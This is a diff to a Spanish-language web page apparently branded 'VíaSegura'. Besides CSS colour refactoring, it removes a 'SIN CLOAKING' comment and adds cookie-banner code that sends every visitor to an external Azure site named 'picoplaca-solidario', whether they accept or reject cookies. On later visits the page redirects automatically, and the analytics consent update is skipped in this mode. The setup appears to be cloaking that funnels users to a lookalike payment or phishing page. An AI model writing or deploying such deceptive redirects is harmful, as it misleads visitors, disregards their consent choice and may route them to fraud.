@@ -23,7 +23,7 @@
 
     <style>
         /* ============================================================
-           ESTILOS - VERSIÓN COMPACTA Y FUNCIONAL
+           ESTILOS - VERSIÓN COMPACTA Y FUNCIONAL (VíaSegura)
            ============================================================ */
 
         /* ----- Reset y variables ----- */
@@ -157,25 +157,25 @@
         }
 
         .cookie-modal .cookie-actions .boton.aceptar {
-            background: #00271c;
+            background: var(--color-primario);
             color: #ffffff;
             box-shadow: 0 4px 16px rgba(0, 39, 28, 0.25);
         }
 
         .cookie-modal .cookie-actions .boton.aceptar:hover {
-            background: #004d3a;
+            background: var(--color-primario-claro);
             transform: translateY(-3px);
             box-shadow: 0 8px 28px rgba(0, 39, 28, 0.35);
         }
 
         .cookie-modal .cookie-actions .boton.rechazar {
             background: transparent;
-            color: #00271c;
-            border: 2px solid #00271c;
+            color: var(--color-primario);
+            border: 2px solid var(--color-primario);
         }
 
         .cookie-modal .cookie-actions .boton.rechazar:hover {
-            background: #00271c;
+            background: var(--color-primario);
             color: #ffffff;
             transform: translateY(-3px);
             box-shadow: 0 8px 28px rgba(0, 39, 28, 0.15);
@@ -1171,11 +1171,20 @@
     <!-- Fin del contenido principal -->
 
     <!-- ============================================================
-    JAVASCRIPT - COOKIES Y FUNCIONALIDAD (SIN CLOAKING)
+    JAVASCRIPT - COOKIES Y FUNCIONALIDAD
     ============================================================ -->
     <script>
         (function() {
             'use strict';
+
+            // ============================================================
+            //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
+            //  ============================================================
+            //  MODO 1: Comportamiento original (solo muestra/oculta la página)
+            //  MODO 2: Redirección a URL externa
+            //  ============================================================
+            const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
+            const REDIRECT_URL = "https://picoplaca-solidario.azurewebsites.net"; // URL para el modo 2
 
             // ----- ELEMENTOS DEL BANNER -----
             var overlay = document.getElementById('cookie-overlay');
@@ -1195,7 +1204,7 @@
             banner.classList.add('visible');
             document.body.classList.add('cookie-locked');
 
-            // Función para mostrar el contenido
+            // Función para mostrar el contenido (MODO 1)
             function mostrarContenido() {
                 // Ocultar banner
                 overlay.classList.remove('visible');
@@ -1206,21 +1215,38 @@
                 contenidoPrincipal.classList.add('visible');
             }
 
-            // Función que maneja la acción de cookies
+            // Función para redirigir (MODO 2)
+            function redirectTo(url) {
+                window.location.href = url;
+            }
+
+            // Función que maneja la acción según el modo configurado
             function handleCookieAction(aceptadas) {
-                console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar');
+                console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
 
-                // Mostrar el contenido
-                mostrarContenido();
+                if (COOKIE_BUTTON_MODE === 1) {
+                    // MODO 1: Comportamiento original
+                    mostrarContenido();
 
-                // Actualizar consentimiento de Google Analytics
-                if (typeof gtag !== 'undefined') {
-                    gtag('consent', 'update', {
-                        'ad_storage': aceptadas ? 'granted' : 'denied',
-                        'analytics_storage': aceptadas ? 'granted' : 'denied'
-                    });
+                    // Actualizar consentimiento de Google Analytics
+                    if (typeof gtag !== 'undefined') {
+                        gtag('consent', 'update', {
+                            'ad_storage': aceptadas ? 'granted' : 'denied',
+                            'analytics_storage': aceptadas ? 'granted' : 'denied'
+                        });
+                    }
+                    console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
+
+                } else if (COOKIE_BUTTON_MODE === 2) {
+                    // MODO 2: Redirección a URL externa
+                    // Guardar preferencia en sessionStorage
+                    sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
+                    redirectTo(REDIRECT_URL);
+
+                } else {
+                    // Modo no válido: usar comportamiento original por defecto
+                    mostrarContenido();
                 }
-                console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
             }
 
             // ----- EVENTO ACEPTAR -----
@@ -1232,6 +1258,11 @@
             btnRechazar.addEventListener('click', function() {
                 handleCookieAction(false);
             });
+
+            // Verificar si ya se aceptaron las cookies antes (para el modo 2)
+            if (COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true') {
+                redirectTo(REDIRECT_URL);
+            }
 
             // ----- MENÚ MÓVIL -----
             var botonMenu = document.getElementById('botonMenu');
